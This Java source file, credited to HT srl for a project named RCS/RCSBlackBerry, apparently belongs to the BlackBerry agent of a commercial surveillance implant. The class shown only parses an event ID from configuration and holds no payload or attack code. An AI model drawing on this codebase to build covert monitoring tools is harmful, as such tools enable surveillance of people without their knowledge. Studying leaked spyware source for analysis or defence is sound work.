//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.action;

import blackberry.Messages;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

abstract class EventAction extends SubAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventAction", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif
    
    protected int eventId;

    public EventAction(ConfAction params) {
        super(params);
    }

    protected boolean parse(ConfAction params) {
        try {            
            this.eventId = params.getInt(Messages.getString("b.1")); //$NON-NLS-1$

        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

}
